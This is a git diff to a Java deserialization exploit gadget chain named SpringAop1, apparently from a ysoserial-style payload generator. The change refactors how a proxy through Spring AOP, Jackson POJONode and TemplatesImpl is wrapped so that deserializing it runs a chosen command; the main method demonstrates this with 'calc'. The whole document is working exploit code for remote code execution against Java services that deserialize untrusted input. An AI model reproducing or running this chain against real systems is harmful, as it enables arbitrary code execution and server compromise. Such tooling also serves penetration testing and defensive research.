@@ -11,12 +11,7 @@ import cn.butler.yso.Serializer;
 import cn.butler.yso.payloads.util.Gadgets;
 import cn.butler.yso.payloads.util.Reflections;
 import javassist.*;
-import javax.xml.transform.Templates;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
-import java.util.ArrayList;
+import java.lang.reflect.*;
 import java.util.HashMap;
 
 /**
@@ -64,7 +59,7 @@ public class SpringAop1 extends PayloadRunner implements ObjectPayload<Object> {
         Method setTarget = advisedSupport.getClass().getMethod("setTarget", Object.class);
         setTarget.invoke(advisedSupport, templates);
         InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(advisedSupport);
-        Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[] {Templates.class},(InvocationHandler)invocationHandler);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[] {Class.forName("javax.xml.transform.Templates")},(InvocationHandler)invocationHandler);
 
 
         //重构置空BaseJsonNode#writeReplace避免在序列化时候触发
@@ -77,30 +72,17 @@ public class SpringAop1 extends PayloadRunner implements ObjectPayload<Object> {
         }
         //POJONode触发TemplatesImpl#getOutputProperties方法
         Class<?> pOJONodeClass = Class.forName("com.fasterxml.jackson.databind.node.POJONode");
-        Constructor<?> constructor1 = pOJONodeClass.getConstructor(Object.class);
-        Object pOJONode = constructor1.newInstance(proxy);
+        Constructor<?> pOJONodeClassConstructor = pOJONodeClass.getConstructor(Object.class);
+        Object pOJONode = pOJONodeClassConstructor.newInstance(proxy);
 
         //XString方式触发POJONode#toString方法
-        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
-        Object xstring = Reflections.createWithoutConstructor(aClass1);
-        Reflections.setFieldValue(xstring,"m_obj",new char[]{});
-        HashMap hashMap1 = new HashMap();
-        HashMap hashMap2 = new HashMap();
-        hashMap1.put("通话",xstring);
-        hashMap1.put("重地",pOJONode);
-        hashMap2.put("重地",xstring);
-        hashMap2.put("通话",pOJONode);
-        HashMap<Object, Object> map = JDKUtil.makeMap(hashMap1, hashMap2);
-        ArrayList<Object> arrayList = new ArrayList<>();
-        arrayList.add(templates);
-        arrayList.add(proxy);
-        arrayList.add(map);
-
-        return arrayList;
+        HashMap hashmap = JDKUtil.makeToStringForXStringForChars(pOJONode);
+        return hashmap;
     }
 
     public static void main(String[] args) throws Exception {
        Object object = new SpringAop1().getObject("Templateslmpl0:auto_cmd:calc");
+       object = new SpringAop1().getObject("SignedObject:SpringAop1:Templateslmpl:raw_cmd:calc");
        byte[] serialize = Serializer.serialize(object);
        Deserializer.deserialize(serialize);
     }
